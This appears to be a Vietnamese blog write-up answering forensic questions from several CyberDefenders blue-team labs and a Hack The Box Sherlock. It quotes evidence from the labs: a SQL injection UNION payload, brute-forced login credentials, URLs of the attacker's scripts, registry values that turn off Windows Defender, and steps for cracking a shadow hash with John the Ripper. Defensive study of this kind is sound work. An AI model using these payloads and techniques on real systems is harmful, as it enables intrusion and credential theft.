- Chrome lưu trữ dữ liệu ở `C:\Users\%USERNAME%\AppData\Local\Google\Chrome\User Data\Default`. Để tìm zip code of the administrator's post, ta vào `Web Data` và export nó ra:
![image](https://hackmd.io/_uploads/Byb1FABb-x.png)
- Dùng tool **DB Browser for SQLite** để mở file vừa export:
![image](https://hackmd.io/_uploads/H1K7KCBWZx.png)
- Chuột phải vào `autofill` và chọn `Browse Table`:
![image](https://hackmd.io/_uploads/SyguKArb-g.png)
**$\rightarrow$ Đáp án cần điền là `19709`.**

#### 6. What are the initials of the person who contacted the admin user from TAAUSAI?
- Tìm và export file `.ost` để xem tin nhắn Outlook. File nằm ở `[root]\Users\Karen\AppData\Local\Microsoft\Outlook\`:
![image](https://hackmd.io/_uploads/rk8yL1LZ-l.png)
- Dùng tool **Kernel OST Viewer** để mở và phân tích file trên:
![image](https://hackmd.io/_uploads/r1gLIkLWZl.png)
- Ở bên trái, chỉ có các phần in đậm là xem được, ta kiểm tra dần các mục đó. Ở tin nhắn thứ tư trong `Inbox`:
![image](https://hackmd.io/_uploads/rysjIJ8-Zg.png)
**$\rightarrow$ Đáp án cần điền là `MS`.**

#### 7. How much money was TAAUSAI willing to pay upfront?
- Ở tin nhắn thứ tư trong `Inbox`, Micheal Scotch bảo rằng:
![image](https://hackmd.io/_uploads/S1BEdJUZWg.png)
- Tiếp tục kiểm tra các thư tiếp theo:
![image](https://hackmd.io/_uploads/S1rttjUbbg.png)
**$\rightarrow$ Đáp án cần điền là `150000`.**

#### 8. What country is the admin user meeting the hacker group in?
- Tiếp tục kiểm tra các thư tiếp theo, ta thấy có lời mời hẹn gặp và địa điểm:
![image](https://hackmd.io/_uploads/S10Hns8ZZl.png)
- Tìm kiếm vị trí dựa trên toạ độ đó:
![image](https://hackmd.io/_uploads/BJoRhoUbWl.png)
**$\rightarrow$ Đáp án cần điền là `Egypt`.**

#### 9. What is the machine's timezone?
> *Use the three-letter abbreviation*

Ở phần United States holidays, bấm vào một cái bất kỳ:
![image](https://hackmd.io/_uploads/BJiP6i8bZl.png)
**$\rightarrow$ Đáp án cần điền là `UTC`.**

#### 10. When was `AlpacaCare.docx` last accessed?
Tìm trên phân vùng 2 không thấy nên ta tìm trong phân vùng 3. Ở `[root]`, phần `Date Accessed`:
![image](https://hackmd.io/_uploads/B1RVv38Wbe.png)
**$\rightarrow$ Đáp án cần điền là `2019-03-17 21:52`.**

#### 11. There was a second partition on the drive. What is the letter assigned to it?
- Để xem second partition trên ổ đĩa, ta tìm file `.lnk` ở trong `/[root]/Users/Karen/AppData/Roaming/Microsoft/Office/Recent/` và export các file đó ra ngoài để phân tích:
![image](https://hackmd.io/_uploads/HkfCKNWXbx.png)
- Mình đã tải tool **LECmd** của Eric Zimmerman để phân tích file `lnk` nhưng không dùng tới vì biểu tượng và tên của các file vừa trích xuất đã chứa đáp án:
![image](https://hackmd.io/_uploads/rknO5NZm-l.png)
**$\rightarrow$ Đáp án cần điền là `A`.**

#### 12. What is the answer to the question Company's manager asked Karen?
- Lục tìm trong phần `Inbox` có một email có nội dung là:
![image](https://hackmd.io/_uploads/ByW1hVbQWl.png)
- Ở email tiếp theo là trả lời từ Michael bảo rằng đáp án chính xác, kéo xuống dưới ta thấy thư trả lời của Karen:
![image](https://hackmd.io/_uploads/S10u34WX-e.png)
![image](https://hackmd.io/_uploads/SyNq2EWXbg.png)
**$\rightarrow$ Đáp án cần điền là `TheCardCriesNoMore`.**

#### 13. What is the job position offered to Karen?
> *3 words, 2 spaces in between*

Trong thư phản hồi để bảo rằng đáp án của Karen là chính xác từ Michael:
![image](https://hackmd.io/_uploads/S1CXp4ZQbg.png)
**$\rightarrow$ Đáp án cần điền là `cyber security analyst`.**

#### 14. When was the admin user password last changed?
- Export `SAM` registry hive và dùng **Registry Explorer** để phân tích.
- SAM hive chứa thông tin user account, thông tin đăng nhập và thông tin nhóm. Các thông tin này chủ yếu nằm ở `SAM\Domains\Account\Users`. Ở mục `Last password change` của group `Administrators`:
![image](https://hackmd.io/_uploads/BJxb-rZm-g.png)
**$\rightarrow$ Đáp án cần điền là `03/21/2019 19:13:09`.**

#### 15. What version of Chrome is installed on the machine?
Chrome lưu trữ dữ liệu (mật khẩu đã lưu, cookies và nhiều thông tin hữu ích khác) ở `/[root]/Users/Karen/AppData/Local/Google/Chrome/User Data/`. Nhấn vào `User Data` và lướt xuống dưới phần `File List` có file `Last Version`. Bấm vào file đó:
![image](https://hackmd.io/_uploads/rk33fH-XZe.png)
**$\rightarrow$ Đáp án cần điền là `72.0.3626.121`.**

#### 16. What is the URL used to download Skype?
- Thử tìm trong SOFTWARE, `Microsoft\Windows\CurrentVersion\App Paths` và tìm đến `Lync.exe`:
![image](https://hackmd.io/_uploads/SJbSBB-7bg.png)
- Có vẻ không đúng, ta thấy ở Partition 3 có `Skype-8.41.0.54.exe`. Bấm vào đó có file `Zone.Identifier`:
![image](https://hackmd.io/_uploads/r1UwvBW7bl.png)
**$\rightarrow$ Đáp án cần điền là `https://download.skype.com/s4l/download/win/Skype-8.41.0.54.exe`.**

#### 17. What is the domain name of the website Karen browsed on Alpaca care that the file `AlpacaCare.docx` is based on?
- Trong phân vùng 3, ở `[root]`, phần `Date Accessed`, export file `AlpacaCare.docx` và mở nó:
![image](https://hackmd.io/_uploads/HJRJ5BbX-e.png)
- Dùng `Ctrl` và click vào `Home`:
![image](https://hackmd.io/_uploads/rkP-5BWmZl.png)
**$\rightarrow$ Đáp án cần điền là `palominoalpacafarm.com`.**

### II. Web Investigation Lab:
> - [Link bài lab](https://cyberdefenders.org/blueteam-ctf-challenges/web-investigation/)
> - Kịch bản:
>![image](https://hackmd.io/_uploads/r1wHmOf8-g.png)
> - File được cho: `WebInvestigation.pcap`

**1. By knowing the attacker's IP, we can analyze all logs and actions related to that IP and determine the extent of the attack, the duration of the attack, and the techniques used. Can you provide the attacker's IP?**
- Vào `Statistics` $\rightarrow$ `Conservations` $\rightarrow$ `IPv4` rồi tìm IP nào có số bytes hay packet lớn bất thường:
![image](https://hackmd.io/_uploads/ByH6UsELZe.png)
**$\rightarrow$ Đáp án: `111.224.250.131`**

**2. If the geographical origin of an IP address is known to be from a region that has no business or expected traffic with our network, this can be an indicator of a targeted attack. Can you determine the origin city of the attacker?**
- Vì đây không phải địa chỉ IP của LAN nên vào trang web https://whatismyipaddress.com và điền địa chỉ IP vừa tìm:
![image](https://hackmd.io/_uploads/SkgXgsjVIZg.png)
**$\rightarrow$ Đáp án: `Shijiazhuang`**

**3. Identifying the exploited script allows security teams to understand exactly which vulnerability was used in the attack. This knowledge is critical for finding the appropriate patch or workaround to close the security gap and prevent future exploitation. Can you provide the vulnerable PHP script name?**
- Vì tệp cần tìm là `.php` nên attaker sẽ dùng POST hoặc GET, lọc `http.request.method == "POST" || http.request.uri contains ".php"`:
![image](https://hackmd.io/_uploads/Sk2jJh4Ibx.png)
Có thể thấy rằng `search.php` bị lạm dụng rất nhiều.

**$\rightarrow$ Đáp án: `search.php`**

**4. Establishing the timeline of an attack, starting from the initial exploitation attempt, what is the complete request URI of the first SQLi attempt by the attacker?**
> Note: Decode the Value.
- Lướt xuống dưới, ở gói tin 357 và URL decode:
![image](https://hackmd.io/_uploads/S1DNW2N8bg.png)
**$\rightarrow$ Đáp án: `/search.php?search=book and 1=1; -- -`**

**5. Can you provide the complete request URI that was used to read the web server's available databases?**
> Note: Decode the Value.
- Để đọc các database có sẵn, thường attacker dùng `SELECT` để nhắm vào `information_schema.schemata`, `information_schema.tables`. Thử URL decode từng gói tin và ở gói 1520 ta tìm được đáp án.

**$\rightarrow$ Đáp án:**
```
/search.php?search=book' UNION ALL SELECT NULL,CONCAT(0x7178766271,JSON_ARRAYAGG(CONCAT_WS(0x7a76676a636b,schema_name)),0x7176706a71) FROM INFORMATION_SCHEMA.SCHEMATA-- -`
```

**6. Assessing the impact of the breach and data access is crucial, including the potential harm to the organization's reputation. What's the table name containing the website users data?**
- Lọc `http.request.uri contains "INFORMATION_SCHEMA.TABLES"` và ta thấy được hai gói tin là request và response của nhau. Chuột phải chọn `Folow` $\rightarrow$ `HTTP Stream`:
![image](https://hackmd.io/_uploads/r1rU2hVIZe.png)

**$\rightarrow$ Đáp án: `/customers`**

**7. The website directories hidden from the public could serve as an unauthorized access point or contain sensitive functionalities not intended for public access. Can you provide the name of the directory discovered by the attacker?**
- `GET` thường để lại dấu vết trên URL, còn `POST` thường được dùng để giấu các payload nặng hay để thay đổi dữ liệu:
    - Tấn công SQLi phức tạp hoặc chèn mã độc dài thường được gửi qua POST để tránh giới hạn độ dài của URL.
    - Attacker thường gửi thông tin đăng nhập qua `POST`, nếu thấy nó hướng đến `/admin/login.php` hay `/development/auth.php` thì đó là brute force.
- Lọc `http.request.method == POST`:
![image](https://hackmd.io/_uploads/Hy52KUP8-e.png)
**$\rightarrow$ Đáp án: `/admin/`**

**8. Knowing which credentials were used allows us to determine the extent of account compromise. What are the credentials used by the attacker for logging in?**
- Xem thử HTTP Stream của từng gói, có thể thấy attacker brute force username và password:
![image](https://hackmd.io/_uploads/H13b0IDI-l.png)
- Ở gói 88699 server trả về `302 Found` nghĩa là đăng nhập thành công:
![image](https://hackmd.io/_uploads/ryqGgvv8Zx.png)
- URL code chuỗi `username=admin&password=admin123%21` thì được `username=admin&password=admin123!`.

**$\rightarrow$ Đáp án: `admin:admin123!`**

**9. We need to determine if the attacker gained further access or control of our web server. What's the name of the malicious script uploaded by the attacker?**
- Sau khi đăng nhập thành công, attacker sẽ được chuyển tới `/admin/index.php`. Xem HTTP của gói tin 88757:
![image](https://hackmd.io/_uploads/ByuIyPw8We.png)

**$\rightarrow$ Đáp án: `NVri2vhp.php`**

### III. BlueSky Ransomware Lab:
> - [Link bài lab](https://cyberdefenders.org/blueteam-ctf-challenges/bluesky-ransomware/)
> - Đề bài:
> ![image](https://hackmd.io/_uploads/S1n2fPwU-l.png)
> - File được cho: `BlueSkyRansomware.evtx`, `BlueSkyRansomware.pcap`

**1. Knowing the source IP of the attack allows security teams to respond to potential threats quickly. Can you identify the source IP responsible for potential port scanning activity?**
- Vào Wireshark mở file, sau đó vào `Statistics` $\rightarrow$ `Conservations` $\rightarrow$ `IPv4` rồi tìm IP nào có số bytes hay packet lớn bất thường:
![image](https://hackmd.io/_uploads/SyvJzyKL-g.png)
**$\rightarrow$ Đáp án: `87.96.21.84`**

**2. During the investigation, it's essential to determine the account targeted by the attacker. Can you identify the targeted account username?**
- Thử lọc string `username` thì gói tin 2641 được highlight. Kiểm tra packet details:

![image](https://hackmd.io/_uploads/HJGewkKIZl.png)

**$\rightarrow$ Đáp án: `sa`**

**3. We need to determine if the attacker succeeded in gaining access. Can you provide the correct password discovered by the attacker?**

Từ output câu trên, ta tìm được cả password.

**$\rightarrow$ Đáp án: `cyb3rd3f3nd3r$`**

**4. Attackers often change some settings to facilitate lateral movement within a network. What setting did the attacker enable to control the target host further and execute further commands?**
- TDS (Tabular Data Stream) là một giao thức tầng ứng dụng (Application Layer) phổ biến database, thường dùng để kết nối app với hệ quản trị database.
    - Gửi đi: Đóng gói mã SQL từ user gửi đến server.
    - Phản hồi: Đóng gói kết quả (các bảng dữ liệu, thông báo lỗi hoặc số dòng bị ảnh hưởng) từ server gửi user.
- Check TDS trong packet details của hai gói tin response sau gói 2641. Ở gói 2645:
![image](https://hackmd.io/_uploads/SkPqtkYIZx.png)
**$\rightarrow$ Đáp án: `xp_cmdshell`**

**5. Process injection is often used by attackers to escalate privileges within a system. What process did the attacker inject the C2 into to gain administrative privileges?**
- Vào file `BlueSkyRansomware.evtx`, trong `Saved Logs` ở phần liên quan đến PowerShell:
![image](https://hackmd.io/_uploads/r1T0oyKLbe.png)
`msfconsole` là giao thức giao diện dòng lệnh (CLI) phổ biến và mạnh mẽ nhất của Metasploit Framework, hacker thường dùng để khai thác lỗ hổng.

**$\rightarrow$ Đáp án: `winlogon.exe`**

**6. Following privilege escalation, the attacker attempted to download a file. Can you identify the URL of this file downloaded?**
- Hầu hết các file được tải qua HTTP, nên ta lọc `http.request.method == "GET"`:
![image](https://hackmd.io/_uploads/r1ZVRJK8bl.png)
- Thử kiểm tra packet details của gói tin đầu:
![image](https://hackmd.io/_uploads/rJHBegFIbx.png)

**$\rightarrow$ Đáp án: `http://87.96.21.84/checking.ps1`**

**7. Understanding which group Security Identifier (SID) the malicious script checks to verify the current user's privileges can provide insights into the attacker's intentions. Can you provide the specific Group SID that is being checked?**
- Kiểm tra TCP Stream của gói tin vừa rồi:
![image](https://hackmd.io/_uploads/S1uUMgKIbx.png)
**$\rightarrow$ Đáp án: `S-1-5-32-544`**

**8. Windows Defender plays a critical role in defending against cyber threats. If an attacker disables it, the system becomes more vulnerable to further attacks. What are the registry keys used by the attacker to disable Windows Defender functionalities? Provide them in the same order found.**
- Nếu attaker dùng cmd để vô hiệu hoá Windows Defender, thử lọc `tcp contains "reg add" || tcp contains "DisableAntiSpyware"` (command này quét toàn bộ dữ liệu TCP để tìm string liên quan đến lệnh Registry hoặc tên khóa):
![image](https://hackmd.io/_uploads/HkU44ltUbl.png)
- Kiểm tra TCP Stream của gói tin:
![image](https://hackmd.io/_uploads/H1JFVlt8Wx.png)
**$\rightarrow$ Đáp án:**
```
DisableAntiSpyware,DisableRoutinelyTakingAction,DisableRealtimeMonitoring,SubmitSamplesConsent,SpynetReporting
```

**9. Can you determine the URL of the second file downloaded by the attacker?**
- Tiếp tục kiểm tra TCP Stream của gói tin đầu tiên sau khi lọc `http.request.method == "GET"`:
![image](https://hackmd.io/_uploads/BkQSSg5UZl.png)
**$\rightarrow$ Đáp án: `http://87.96.21.84/del.ps1`**

**10. Identifying malicious tasks and understanding how they were used for persistence helps in fortifying defenses against future attacks. What's the full name of the task created by the attacker to maintain persistence?**
- Nếu attacker tạo task thông qua một kết nối từ xa như `xp_cmdshell`, lệnh này sẽ nằm trong gói tin dữ liệu. Thử lọc `tcp contains "schtasks" || tcp contains "Register-ScheduledTask"`:
![image](https://hackmd.io/_uploads/rkAJ_e98bx.png)
- Kiểm tra TCP Stream:
![image](https://hackmd.io/_uploads/HyN-Oe5L-l.png)
Chú ý phần `/tn` nghĩa là Task Name.

**$\rightarrow$ Đáp án: `\Microsoft\Windows\MUI\LPupdate`**

**11. Based on your analysis of the second malicious file, What is the MITRE ID of the main *tactic* the second file tries to accomplish?**
- Vì attacker tắt Windows Defender nên tra MITRE thì:

![image](https://hackmd.io/_uploads/ryXnql9Ubx.png)

**$\rightarrow$ Đáp án: `TA0005`**

**12. What's the invoked PowerShell script used by the attacker for dumping credentials?**
- Kiểm tra HTTP Stream của gói tin thứ hai sau khi lọc `http.request.method == "GET"`:
![image](https://hackmd.io/_uploads/By563xq8be.png)
**$\rightarrow$ Đáp án: `Invoke-PowerDump.ps1`**

**13. Understanding which credentials have been compromised is essential for assessing the extent of the data breach. What's the name of the saved text file containing the dumped credentials?**
- Kiểm tra từng HTTP Stream và TCP Stream của gói tin trong filter đang lọc. Ở HTTP Stream của gói thứ năm:
![image](https://hackmd.io/_uploads/SyfU1WqUZl.png)
**$\rightarrow$ Đáp án: `hashes.txt`**

**14. Knowing the hosts targeted during the attacker's reconnaissance phase, the security team can prioritize their remediation efforts on these specific hosts. What's the name of the text file containing the discovered hosts?**
- Trong HTTP Stream của gói tin thứ hai:
![image](https://hackmd.io/_uploads/BJT8Tec8Ze.png)
**$\rightarrow$ Đáp án: `extracted_hosts.txt`**

**15. After hash dumping, the attacker attempted to deploy ransomware on the compromised host, spreading it to the rest of the network through previous lateral movement activities using SMB. You’re provided with the ransomware sample for further analysis. By performing behavioral analysis, what’s the name of the ransom note file?**
- Trích xuất file `javaw.exe` ra rồi phân tích nó:
![image](https://hackmd.io/_uploads/Bk4U7-cLZe.png)
- Vì file này là ransomware nên bị Windows Defender chặn, tham khảo write up mạng thì ta có:
![image](https://hackmd.io/_uploads/Hydu_-qIbe.png)
![image](https://hackmd.io/_uploads/BklKdbcU-l.png)
**$\rightarrow$ Đáp án: `# DECRYPT FILES BLUESKY #`**

**16. In some cases, decryption tools are available for specific ransomware families. Identifying the family name can lead to a potential decryption solution. What's the name of this ransomware family?**
- Đưa mã băm lên [VirusTotal](https://www.virustotal.com/gui/home/upload):
![image](https://hackmd.io/_uploads/H1ftYW9Lbx.png)
![image](https://hackmd.io/_uploads/BkeiYb58Zg.png)

**$\rightarrow$ Đáp án: `bluesky`**

### IV. Insider Lab:
> Analyze Linux disk image artifacts, including logs and Bash history, using FTK Imager to investigate insider threat activities and reconstruct user actions.
- [Link bài lab](https://cyberdefenders.org/blueteam-ctf-challenges/insider/)
- Đề bài: *"After Karen started working for 'TAAUSAI,' she began doing illegal activities inside the company. 'TAAUSAI' hired you as a soc analyst to kick off an investigation on this case. You acquired a disk image and found that Karen uses Linux OS on her machine. Analyze the disk image of Karen's computer and answer the provided questions."*
- Đề cho file `.zip` chứa `FirstHack.ad1` và `FirstHack.ad1.txt`.
![image](https://hackmd.io/_uploads/BJAwY0GqZx.png)

#### 1. Which Linux distribution is being used on this machine?
- `/boot`: Chứa nhân Linux để khởi động, các file liên quan đến trình khởi động và các file system maps cũng như các file khởi động giai đoạn hai.
- Vào `[root]/boot`:
![image](https://hackmd.io/_uploads/BJSsaCMqWl.png)

**$\rightarrow$ Đáp án: `kali`**

#### 2. What is the MD5 hash of the Apache `access.log` file?
Apache `access.log` file nằm ở `/[root]/var/log/apache2`. Chuột phải vào file, chọn `Export File Hash List...`:
![image](https://hackmd.io/_uploads/Bkl3JkXcWl.png)
![image](https://hackmd.io/_uploads/Hyb0yJmq-x.png)

**$\rightarrow$ Đáp án: `d41d8cd98f00b204e9800998ecf8427e`**

#### 3. It is suspected that a credential dumping tool was downloaded. What is the name of the downloaded file?
Check thư mục `/[root]/root/Downloads`:
![image](https://hackmd.io/_uploads/rytl-175bl.png)
**$\rightarrow$ Đáp án: `mimikatz_trunk.zip`**

#### 4. A super-secret file was created. What is the absolute path to this file?
Trong `[root]/root/.bash_history`:
![image](https://hackmd.io/_uploads/SJ6gDJmcZx.png)
**$\rightarrow$ Đáp án: `/root/Desktop/SuperSecretFile.txt`**

#### 5. What program used the file `didyouthinkwedmakeiteasy.jpg` during its execution?
Lướt đến cuối `.bash_history`:
![image](https://hackmd.io/_uploads/S11XdyQqWl.png)
**$\rightarrow$ Đáp án: `binwalk`**

#### 6. What is the third goal from the checklist Karen created
- Check thư mục `/[root]/root/Desktop`:
![image](https://hackmd.io/_uploads/SJqyKyQqZx.png)
- Bấm chuột vào `Checklist` thì ta có được nội dung sau:
![image](https://hackmd.io/_uploads/Hk6lt1Qq-l.png)

**$\rightarrow$ Đáp án: `Profit`**

#### 7. How many times was Apache run?
Quay lại với `/[root]/var/log/apache2`, ta thấy cả ba file đều trống, chứng tỏ nó chưa chạy:
![image](https://hackmd.io/_uploads/rkHBqy7cWg.png)
**$\rightarrow$ Đáp án: `0`**

#### 8. This machine was used to launch an attack on another. Which file contains the evidence for this
Check thư mục `/[root]/root/`, ta thấy có một bức ảnh chụp lại command cho thấy User đang là Bob:
![image](https://hackmd.io/_uploads/rJsy0yX9Wx.png)
![ftk_b4384b97-cbdb-4e2a-8a4b-f5992c15564f](https://hackmd.io/_uploads/SkMra17qWx.jpg)
**$\rightarrow$ Đáp án: `irZLAohL.jpeg`**

#### 9. It is believed that Karen was taunting a fellow computer expert through a bash script within the Documents directory. Who was the expert that Karen was taunting?
Trong `/[root]/root/Documents/myfirsthack/firstscript_fixed`:
![image](https://hackmd.io/_uploads/HJsLglm5-g.png)
**$\rightarrow$ Đáp án: `Young`**

#### 10. A user executed the su command to gain root access multiple times at 11:26. Who was the user?
Vào `/[root]/var/log/` lục tìm trong các log có dấu thời gian `11:26`. Ở `/auth.log`:
![image](https://hackmd.io/_uploads/ByOkHxXc-l.png)
![image](https://hackmd.io/_uploads/ByGZBxXcZg.png)
**$\rightarrow$ Đáp án: `postgres`**

#### 11. Based on the bash history, what is the current working directory?
Quay lại với `.bash_history`:
![image](https://hackmd.io/_uploads/rJVm8l7cZl.png)
**$\rightarrow$ Đáp án: `/root/Documents/myfirsthack/`**

### V. Hacked Lab:
> Reconstruct initial access, system modifications, and persistence on a compromised Linux server by analyzing disk images and cracking passwords.
> Uncompress the lab (Pass: `cyberdefenders.org`).
- [Link bài lab](https://cyberdefenders.org/blueteam-ctf-challenges/hacked/)
- Kịch bản: *"A soc analyst has been called to analyze a compromised Linux web server. Figure out how the threat actor gained access, what modifications were applied to the system, and what persistent techniques were utilized. (e.g. backdoors, users, sessions, etc)."*
- Đề cho file `71-Hacked.zip` chứa `Webserver.E01`.

#### 1. What is the system timezone
Kiểm tra `/etc/timezone`:
![image](https://hackmd.io/_uploads/H19S6qm5We.png)
**$\rightarrow$ Đáp án: `Europe/Brussels`**

#### 2. Who was the last user to log in to the system?
- Thử kiểm tra `/var/log/lastlog` (Hiển thị thông tin đăng nhập gần đây cho tất cả user):
![image](https://hackmd.io/_uploads/H1D6ko75-e.png)
Có vẻ không dùng được.
- Check tiếp `/var/log/auth.log` (Chứa thông tin xác thực trên hệ thống trong máy chủ Debian và Ubuntu được ghi lại), lướt xuống đến cuối:
![image](https://hackmd.io/_uploads/H1JGzoQcbe.png)
Lúc đầu thấy `user mail` nhưng bỏ qua vì nghĩ rằng `mail` là `thư`. Lướt lên trên thì:
![image](https://hackmd.io/_uploads/S1VjWo7cWl.png)

**$\rightarrow$ Đáp án: `mail`**

#### 3. What was the source port the user 'mail' connected from?
Từ output câu trên:
![image](https://hackmd.io/_uploads/SJAgMomqZe.png)
**$\rightarrow$ Đáp án: `57708`**

#### 4. How long was the last session for user 'mail'? (Minutes only)
Từ output câu trên:
![image](https://hackmd.io/_uploads/ryqOfim9-l.png)
**$\rightarrow$ Đáp án: `1`**

#### 5. Which server service did the last user use to log in to the system?
Từ output câu trên:
![image](https://hackmd.io/_uploads/Hkay7sXcZg.png)
**$\rightarrow$ Đáp án: `sshd`**

#### 6. What type of authentication attack was performed against the target machine?
Từ output câu trên, có thể thấy attacker thử rất nhiều lần:
![image](https://hackmd.io/_uploads/SyIGHsQqWx.png)
**$\rightarrow$ Đáp án: `brute-force`**

#### 7. How many IP addresses are listed in the `/var/log/lastlog` file?
Từ output câu 2:
![image](https://hackmd.io/_uploads/H1D6ko75-e.png)
**$\rightarrow$ Đáp án: `2`**

#### 8. How many users have a login shell?
Khi một user đăng nhập thành công shell programme sẽ hiện `/bin/bash`, ngược lại thì `/nologin` hoặc `/bin/false`:
![image](https://hackmd.io/_uploads/HkvNYs79-l.png)
**$\rightarrow$ Đáp án: `5`**

#### 9. What is the password of the mail user?
> - Chi tiết về `/etc/shadow`: [Understanding `/etc/shadow` file format on Linux](https://www.cyberciti.biz/faq/understanding-etcshadow-file/)
> - Link tải John the Ripper: [John the Ripper password cracker](https://www.openwall.com/john/)
- Ta có file `/etc/passwd` và `/etc/shadow`. Trong `/shadow` (File hệ thống trong đó mật khẩu user được mã hóa để không sẵn có cho những người cố gắng xâm nhập vào hệ thống):
![image](https://hackmd.io/_uploads/rJwwjjQqbl.png)
Có thể thấy:
    - Username: `mail`
    - `$6`: Ký hiệu cho thấy password được băm bằng SHA512.
    - `$zLaoLV8N`: Salt ngẫu nhiên để mã hoá password, để ngăn chặn hai user có cùng mật khẩu tạo ra các mục trùng lặp trong `/etc/shadow`.
    - Password được băm bằng SHA512:
    ```
    $BNxYZUxvXiZwb3UjBhCxnxd9Mb02DDUF.GfMj1kbLB.s/quBVtMM4QjfOvmZvfqeh7BuLXaRvRSfpQgNI5prE.
    ```
    Mã băm được mã hoá của user, sau đó chuỗi salt và password chưa mã hóa được kết hợp và mã hóa để tạo ra mã băm được mã hóa của mật khẩu. Copy toàn bộ dòng tìm được ra file `shadow.txt`.
- Tải `rockyou.txt` ở [link](https://github.com/brannondorsey/naive-hashcat/releases/tag/data) rồi để nó nằm cùng thư mục với `shadow.txt` (ở đây là Desktop).
- Dùng tool John the Ripper để crack
![image](https://hackmd.io/_uploads/SJtuK3XqWe.png)

**$\rightarrow$ Đáp án: `forensics`**

#### 10 Which user account was created by the attacker?
Ở output câu 6:
![image](https://hackmd.io/_uploads/B1aIH3m9bg.png)
**$\rightarrow$ Đáp án: `php`**

#### 11. How many user groups exist on the machine?
Trong `[root]/etc/group` đếm được có 58 groups:
![image](https://hackmd.io/_uploads/H1cUuNB5bx.png)
**$\rightarrow$ Đáp án: `58`**

#### 12. How many users have sudo access?
Cũng trong output ở câu trên:
![image](https://hackmd.io/_uploads/Sk16dEHcZl.png)
**$\rightarrow$ Đáp án: `2`**

#### 13. What is the home directory of the `PHP` user?
- Lần mò thì ta thấy `/usr/php`:
![image](https://hackmd.io/_uploads/HkU3KVBcbe.png)
- Ngoài ra, trong `[root]/var/log/auth.log`:
![image](https://hackmd.io/_uploads/HyKW3NBc-l.png)

**$\rightarrow$ Đáp án: `/usr/php`**

#### 14. What command did the attacker use to gain root privilege?
> (Answer contains two spaces).
- Trong `/var/log/auth.log`, ta thấy rằng user `mail` đã vào được quyền root (`sudo`):
![image](https://hackmd.io/_uploads/rkVReHSqZl.png)
- Trong `/var/mail/.bash_history`:
![image](https://hackmd.io/_uploads/H1p-WBSqbl.png)

**$\rightarrow$ Đáp án: `sudo su -`**

#### 15. Which file did the user `root` delete?
Trong `/[root]/root/.bash_history`, lướt xuống cuối:
![image](https://hackmd.io/_uploads/Bk_TmrB9Zg.png)
**$\rightarrow$ Đáp án: `37292.c`**

#### 16. Recover the deleted file, open it and extract the exploit author name.
- Để khôi phục file đã xoá, mount image:
![image](https://hackmd.io/_uploads/SkyVIrS5-g.png)
- Tải [R-Studio](https://www.r-studio.com/Data_Recovery_Download.shtml) và dùng bản demo.
- Chuột trái vào ổ đĩa vừa mount và chọn `Show Files`:
![image](https://hackmd.io/_uploads/HyHmTSH9bx.png)
- Tick vào phần `/tmp`, sau đó chuột phải vào file cần recover và chọn `Recover...`:
![image](https://hackmd.io/_uploads/Sk-p6BBqWx.png)
- Sau khi khôi phục, mở file và ta thấy:
![image](https://hackmd.io/_uploads/HJNSCHB9Ze.png)

**$\rightarrow$ Đáp án: `rebel`**

#### 17. What is the content management system (CMS) installed on the machine?
- CMS là phần mềm giúp user tạo, quản lý và chỉnh sửa nội dung trên một trang web mà không cần phải giỏi về lập trình. Các CMS phổ biến nhất thường gặp:
    - WordPress: Phổ biến nhất (chiếm hơn 40% web thế giới).
    - Joomla, Drupal: Thường dùng cho các hệ thống phức tạp hơn.
    - Magento: Chuyên về thương mại điện tử.
- Trong `/[root]/home/vulnosadmin/.bash_history`:
![image](https://hackmd.io/_uploads/Hy7oWLrqWe.png)

**$\rightarrow$ Đáp án: `Drupal`**

#### 18. What is the version of the CMS installed on the machine?
Trong `/var/www/html/jabc/includes/bootstrap.inc`:
![image](https://hackmd.io/_uploads/SJr67IrcZe.png)
**$\rightarrow$ Đáp án: `7.26`**

#### 19. Which port was listening to receive the attacker's reverse shell?
- Hệ thống Linux thường ghi lại các nỗ lực kết nối hoặc các tiến trình bất thường. Vào `/var/log/apache2/access.log`, ta tìm được đoạn code base64 rất dài so với các dòng khác:
![image](https://hackmd.io/_uploads/ryDLKIBcWe.png)
- Copy toàn bộ và decode:
![image](https://hackmd.io/_uploads/BkdZcUHc-x.png)
![image](https://hackmd.io/_uploads/rJU0cUSqWl.png)
> Đây là một PHP Reverse Shell Payload cực nguy hiểm, thường được tạo ra bởi các framework như Metasploit (Meterpreter). Mục tiêu của nó là kết nối từ máy chủ bị nạn (victim) ngược về máy của kẻ tấn công (attacker) để nhận lệnh và thực thi mã từ xa.

**$\rightarrow$ Đáp án: `4444`**

## E. Hack The Box:
### I. Packet Puzzle:
- [Link bài lab](https://app.hackthebox.com/sherlocks/Packet%2520Puzzle?tab=play_sherlock)
- Đề bài: *"You are a junior security analyst at a small Japanese cryptocurrency trading company. After detecting suspicious activity on the internal network, you exported a PCAP for further investigation. Analyze this capture to determine whether the environment was compromised and reconstruct the attacker’s actions."*
- File được cho: `PacketPuzzle.zip`, giải nén ra ta được `NetworkTraffic.pcap`

#### 1. What is the source IP address of the attacker involved in this Attack?
> IPv4 address

Attacker thường bắt đầu bằng việc gửi rất nhiều gói tin đến client, vào `Statistics` $\rightarrow$ `Conservations` $\rightarrow$ `IPv4` rồi tìm IP nào có số bytes hay packet lớn bất thường:

![image](https://hackmd.io/_uploads/rkhsy_Arbg.png)
**$\rightarrow$ Đáp án cần điền là `192.168.170.128`**

#### 2. How many open ports did the attacker discover on the victim's system?
> number, such as 3, 17, or 4567
- Attacker thường dùng Nmap, một port được coi là mở khi nó phản hồi gói tin `SYN`/`ACK` sau khi nhận được gói `SYN`.
- Lọc `tcp.flags.syn == 1 && tcp.flags.ack == 1 && ip.dst == 192.168.170.128`:

![image](https://hackmd.io/_uploads/r1jwWu0HWg.png)

**$\rightarrow$ Đáp án cần điền là `8`**

#### 3. What is the first open port that responded on the victim's system during reconnaissance?
> number, such as 3, 17, or 4567

Từ output câu trên, có thể thấy rằng port mở đầu tiên là `22`.

**$\rightarrow$ Đáp án cần điền là `22`**

#### 4. What is the CVE identifier for the vulnerability exploited by the attacker?
> CVE-****-****
- RCE thường tấn công theo kiểu gửi một lượng lớn commands vào form hoặc tham số ẩn nên sẽ dùng `POST` thay vì `GET`, ta lọc `ip.src == 192.168.170.128 && http.request.method == "POST"`:

![image](https://hackmd.io/_uploads/SkbXOOCBbg.png)
- Gói tin thứ tư khá đáng nghi vì nó có `allow_url_include` và `auto_prepend_file=php://input` là dấu hiệu của ép command PHP nên ta xem TCP Stream của nó:

![image](https://hackmd.io/_uploads/HkjSOuRrZe.png)

